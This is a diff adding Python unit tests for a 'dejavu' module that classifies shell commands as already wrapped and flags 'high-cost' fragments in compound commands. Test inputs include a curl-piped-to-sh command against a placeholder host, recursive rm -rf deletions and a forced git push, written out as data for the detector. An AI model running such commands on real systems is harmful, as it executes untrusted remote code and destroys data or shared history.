@@ -46,8 +46,74 @@ def test_already_wrapped_relative():
     assert dejavu.is_already_wrapped("./run.sh")
 
 
+def test_already_wrapped_task_runners():
+    assert dejavu.is_already_wrapped("make test")
+    assert dejavu.is_already_wrapped("make")
+    assert dejavu.is_already_wrapped("just build")
+    assert dejavu.is_already_wrapped("rake test")
+
+
+def test_already_wrapped_package_run():
+    assert dejavu.is_already_wrapped("npm run lint")
+    assert dejavu.is_already_wrapped("pnpm run dev")
+    assert dejavu.is_already_wrapped("yarn run build")
+    assert dejavu.is_already_wrapped("bun run test --watch")
+
+
+def test_bare_package_install_not_wrapped():
+    """npm/pnpm install is not a wrapper — it's a legit wrapper candidate."""
+    assert not dejavu.is_already_wrapped("npm install")
+    assert not dejavu.is_already_wrapped("pnpm install --frozen-lockfile")
+    assert not dejavu.is_already_wrapped("yarn add foo")
+
+
+def test_already_wrapped_orientation():
+    """Bare orientation commands are not wrapper candidates."""
+    assert dejavu.is_already_wrapped("ls")
+    assert dejavu.is_already_wrapped("ls -la")
+    assert dejavu.is_already_wrapped("ls /home/foo/project/")
+    assert dejavu.is_already_wrapped("pwd")
+    assert dejavu.is_already_wrapped("which python3")
+    assert dejavu.is_already_wrapped("cd /tmp")
+
+
+def test_orientation_in_compound_is_not_skipped():
+    """`cd /path && something` is a real workflow — don't filter."""
+    assert not dejavu.is_already_wrapped("cd ~/.doom.d && git log --oneline -5")
+    assert not dejavu.is_already_wrapped("ls -la | grep foo")
+
+
 def test_already_wrapped_negative():
     assert not dejavu.is_already_wrapped("git status")
-    assert not dejavu.is_already_wrapped("make test")
-    assert not dejavu.is_already_wrapped("npm install")
+    assert not dejavu.is_already_wrapped("cargo build")
     assert not dejavu.is_already_wrapped("")
+
+
+def test_high_cost_fragment_compound():
+    cmd = "make clean && rm -rf /tmp/build && echo done"
+    assert dejavu.matched_high_cost_fragment(cmd) == "rm -rf /tmp/build"
+
+
+def test_high_cost_fragment_standalone():
+    assert dejavu.matched_high_cost_fragment("rm -rf /tmp/x") == "rm -rf /tmp/x"
+
+
+def test_high_cost_fragment_curl_pipe_sh():
+    cmd = "curl https://x.example/i.sh | sh && echo done"
+    frag = dejavu.matched_high_cost_fragment(cmd)
+    assert frag is not None
+    assert "curl" in frag and "sh" in frag
+    assert "echo done" not in frag
+
+
+def test_high_cost_fragment_force_push():
+    cmd = "git status && git push origin main --force && echo done"
+    frag = dejavu.matched_high_cost_fragment(cmd)
+    assert frag is not None
+    assert "--force" in frag
+    assert "echo done" not in frag
+
+
+def test_high_cost_fragment_returns_none_for_safe_cmd():
+    assert dejavu.matched_high_cost_fragment("ls -la") is None
+    assert dejavu.matched_high_cost_fragment("git status") is None
